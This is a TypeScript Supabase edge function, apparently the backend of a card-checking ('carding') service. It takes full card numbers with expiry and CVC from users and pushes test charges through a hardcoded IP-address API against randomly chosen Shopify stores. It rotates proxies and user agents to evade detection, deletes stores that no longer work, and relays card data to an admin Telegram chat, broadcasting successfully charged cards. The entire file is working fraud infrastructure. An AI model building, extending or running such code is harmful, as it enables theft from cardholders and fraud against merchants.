import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_BASE_URL = "http://188.137.230.163:5000/shopify";

const badResponses = [
  "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
];

const sendAdminDebug = async (
  cc: string,
  status: string,
  message: string,
  rawResponse: string,
  username?: string,
  site?: string
) => {
  if (!TELEGRAM_BOT_TOKEN) return;

  try {
    const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const truncatedRaw = rawResponse.length > 1500 
      ? rawResponse.substring(0, 1500) + '... [truncated]' 
      : rawResponse;
    
    const debugMessage = `🔧 <b>SHOPIFY CHARGE DEBUG</b>

📇 <b>Card:</b> <code>${maskedCard}</code>
👤 <b>User:</b> ${username || 'Unknown'}
🌐 <b>Site:</b> <code>${site || 'N/A'}</code>
📊 <b>Status:</b> ${status.toUpperCase()}
💬 <b>Message:</b> ${message}

━━━━ RAW API RESPONSE ━━━━
<pre>${truncatedRaw}</pre>

🕐 ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: debugMessage,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("[SHOPIFY-CHARGE] Failed to send admin debug:", error);
  }
};

const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[SHOPIFY-CHARGE] notify-charged-card error:", err));
};

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];

  let lowestPrice = Infinity;
  let priceStr = "$0.00";

  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value > 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }

  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
  const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}`;
  
  console.log(`[SHOPIFY-CHARGE] Calling: ${API_BASE_URL}?site=${site}&cc=***&proxy=${proxy ? 'yes' : 'none'}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 60000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': getRandomItem(userAgents),
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[SHOPIFY-CHARGE] Response: ${rawText.substring(0, 500)}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
    }

    // Check for bad responses
    const isBadResponse = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
    if (isBadResponse) {
      return { status: 'dead', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    let { price, priceStr } = extractPrice(rawText);
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    let apiResponse = '';
    
    try {
      const json = JSON.parse(rawText);
      
      // Extract Price and Response directly from API JSON
      if (json.Price !== undefined && json.Price > 0) {
        price = json.Price;
        priceStr = `$${Number(json.Price).toFixed(2)}`;
      }
      if (json.Response) {
        apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
      }
      
      apiMessage = json.message || json.msg || json.error || rawText;
      
      if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
        apiStatus = 'live';
        apiMessage = json.message || 'Charged';
      } else if (json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error' || json.full_response === false) {
        apiStatus = 'dead';
        apiMessage = json.message || json.error || 'Declined';
      } else {
        const lower = String(apiMessage).toLowerCase();
        if (lower.includes('charged') || lower.includes('success') || lower.includes('approved') || lower.includes('thank you')) {
          apiStatus = 'live';
        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                   lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect') ||
                   lower.includes('do_not_honor') || lower.includes('fraud') || lower.includes('error') ||
                   lower.includes('failed') || lower.includes('not accepted')) {
          apiStatus = 'dead';
        }
      }
    } catch {
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved') || lower.includes('thank you for your purchase')) {
        apiStatus = 'live';
      } else if (lower.includes('declined') || lower.includes('error') || lower.includes('failed') || lower.includes('invalid')) {
        apiStatus = 'dead';
      }
    }
    
    return { status: apiStatus, message: apiMessage, apiResponse, rawResponse: rawText, price, priceStr };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[SHOPIFY-CHARGE] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Timeout', apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation - CVC required
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Auth check
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check and get username
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Get a random site from gateway_urls using service role
    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    
    const { data: sites, error: sitesError } = await adminClient
      .from('gateway_urls')
      .select('url, price')
      .order('created_at', { ascending: false });

    if (sitesError || !sites || sites.length === 0) {
      return new Response(JSON.stringify({ 
        error: 'No Shopify sites available. Admin needs to add sites via Health Check.', 
        computedStatus: 'unknown' 
      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Pick a random site
    const randomSite = getRandomItem(sites);
    console.log(`[SHOPIFY-CHARGE] Using site: ${randomSite.url} (price: ${randomSite.price})`);

    // Get user's own proxies (required, 1-10)
    const { data: userProxies, error: proxyError } = await adminClient
      .from('user_proxies')
      .select('*')
      .eq('user_id', user.id);

    if (proxyError || !userProxies || userProxies.length < 1) {
      return new Response(JSON.stringify({ 
        error: 'You must add at least 1 proxy before using Shopify Charge.', 
        computedStatus: 'unknown' 
      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Shuffle proxies for rotation
    const shuffledProxies = [...userProxies].sort(() => Math.random() - 0.5);
    
    const formatProxy = (p: typeof userProxies[0]) => 
      p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;

    // Try proxies with rotation - retry on 407/proxy errors
    let result: { status: string; message: string; rawResponse: string; price: number; priceStr: string } | null = null;
    const maxRetries = Math.min(shuffledProxies.length, 3);
    
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      const proxyStr = formatProxy(shuffledProxies[attempt]);
      console.log(`[SHOPIFY-CHARGE] Attempt ${attempt + 1}/${maxRetries} with proxy ${shuffledProxies[attempt].ip}:${shuffledProxies[attempt].port}`);
      
      result = await callApi(cc, randomSite.url, proxyStr);
      
      // Check if it's a proxy-related error (407, proxy auth, connection refused)
      const rawLower = (result.rawResponse || '').toLowerCase();
      const isProxyError = rawLower.includes('407') || rawLower.includes('proxy error') || 
                           rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
                           rawLower.includes('proxy connect') || rawLower.includes('tunneling socket');
      
      if (!isProxyError) {
        console.log(`[SHOPIFY-CHARGE] Success on attempt ${attempt + 1}`);
        break;
      }
      
      console.log(`[SHOPIFY-CHARGE] Proxy error on attempt ${attempt + 1}, ${attempt + 1 < maxRetries ? 'retrying...' : 'no more proxies'}`);
    }
    
    if (!result) {
      result = { status: 'unknown', message: 'All proxies failed', rawResponse: '', price: 0, priceStr: '$0.00' };
    }

    // Auto-remove bad sites from gateway_urls
    const rawLower = (result.rawResponse || '').toLowerCase();
    const isBadSite = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
    
    if (isBadSite || (result.status === 'unknown' && (!result.rawResponse || rawLower === '' || rawLower.includes('empty response') || rawLower.includes('timeout')))) {
      const removalReason = isBadSite ? 'Bad Shopify response' : 'Empty/Timeout response';
      console.log(`[SHOPIFY-CHARGE] Removing site: ${randomSite.url} - ${removalReason}`);
      adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(({ error: delErr }) => {
        if (delErr) console.error('[SHOPIFY-CHARGE] Failed to remove site:', delErr);
        else console.log(`[SHOPIFY-CHARGE] Site removed: ${randomSite.url}`);
      });

      if (TELEGRAM_BOT_TOKEN) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_TELEGRAM_CHAT_ID,
            text: `🗑️ <b>SHOPIFY SITE AUTO-REMOVED</b>\n\n<code>${randomSite.url}</code>\n\n<i>Reason: ${removalReason}</i>`,
            parse_mode: "HTML",
          }),
        }).catch(() => {});
      }
    }

    // Map status
    let computedStatus: string;
    let displayStatus: string;
    
    if (result.status === 'live') {
      computedStatus = 'live';
      displayStatus = 'CHARGED';
    } else if (result.status === 'dead') {
      computedStatus = 'dead';
      displayStatus = 'DECLINED';
    } else {
      computedStatus = 'unknown';
      displayStatus = 'UNKNOWN';
    }

    const chargeAmount = result.price > 0 ? result.priceStr : (randomSite.price ? `$${Number(randomSite.price).toFixed(2)}` : 'Auto');

    // Send debug to admin for all non-dead results
    if (result.status !== 'dead') {
      sendAdminDebug(
        cc,
        result.status,
        result.message,
        result.rawResponse,
        profile?.username || user.email,
        randomSite.url
      );
    }
    
    // Broadcast CHARGED cards to channel
    if (result.status === 'live') {
      notifyChargedCard(
        user.id,
        cc,
        'CHARGED',
        result.message,
        chargeAmount,
        'Shopify Charge'
      );
    }
    
    return new Response(
      JSON.stringify({
        computedStatus,
        apiStatus: displayStatus,
        apiMessage: result.apiResponse || result.message,
        apiTotal: chargeAmount,
        apiPrice: result.priceStr,
        status: computedStatus,
        message: result.message,
        rawResponse: result.rawResponse,
        usedSite: randomSite.url,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
